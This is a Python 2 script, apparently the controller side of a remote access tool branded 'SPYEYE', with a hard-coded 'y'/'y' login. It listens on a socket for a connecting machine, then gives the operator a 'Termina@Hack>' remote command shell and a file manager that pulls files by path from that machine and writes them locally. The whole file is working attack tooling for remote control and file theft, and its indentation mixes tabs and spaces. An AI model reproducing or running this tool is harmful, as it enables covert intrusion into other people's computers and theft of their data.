import socket
import os,sys,subprocess
os.system("clear")
s = socket.socket()

#################

def logo():
    print("""
  _____   _____  __    __  _____  __    __  _____
 /  ___/ |  _  \ \ \  / / | ____| \ \  / / | ____|
 | |___  | |_| |  \ \/ /  | |__    \ \/ /  | |__
 \___  \ |  ___/   \  /   |  __|    \  /   |  __|
  ___| | | |       / /____| |___    / /    | |___
 /_____/ |_|      /_/     |_____|  /_/     |_____|

 -------------------------------------------------

 [*] Versions : 1.0.0
 [*] Yazid Derbal
 [*] DZ
  """)

#####################

def help():
    print("""
        Commands :
             ---------------------------------------------------

             1/Enter the word (help)
             2/Enter (d)to run the program

             ---------------------------------------------------

             3/Enter username : Enter your  user name (y)
             4/Enter password : Enter your  password (y)

             ---------------------------------------------------

             5/Enter HOST       : Enter Your Host (127.0.0.1)
             6/Enter PORT       : Enter Your Port (5555)
             ---------------------------------------------------
        Please Report This bug To My FB
        FB :
        FP : \n""")

######################

def login():
    print (" Hello user ,login program ")
    username = raw_input (" Enter your  user name  please: ")
    password = raw_input (" Enter your  password  please: ")
    username_varification = "y"
    password_varification = "y"
    if username_varification == username and password_varification == password:
        print ("Hello admin")
        contol()
    else :
        print ("Wrong password or username")
        login()

#########################
def main():
    while True:
        print ("Enter the word (help),Or (d)to run the program")
        cmd = raw_input("=====> ")

        if cmd == "help":
            help()

        elif cmd == 'd':
            os.system("clear")
            logo()
            login()
            main()

############

def contol():

        os.system("clear")
        logo()
        host = raw_input("Enter Your host: ")
        port = input("Enter Your port: ")
        #host = "127.0.0.1"
        #port = 5555
        s.bind((host, port))
        print ("waiting ....")
        s.listen(100)
        x()

##########

def x():
    c, addr = s.accept()
    print ("connected ... ",addr)
    print ("")
    print ("1 - Terminal")
    print ("2 - File Manager")
    print ("3 - exit")
    mssgA = raw_input(">>>>> ")
    c.send(mssgA)
    if (mssgA == "1"):
        mssg = ""
        while mssg != "e":
            mssg = raw_input("Termina@Hack> ")
            c.send(mssg)
            data = c.recv(1024)
            print str(data)
###############
    elif (mssgA == "2"):
        mssg = ""
        while mssg != 'e':
 	    f_p = raw_input("Path :")
            c.send(f_p)
	    f = c.recv(10000)
	    f_n = raw_input("Name :")
            n_f = open(f_n, 'wb')
	    n_f.write(f)
      	    n_f.close()
            print ("succ")
##############
    else :
        print ("Exit")
        s.close()
logo()
main()
contol()
x()
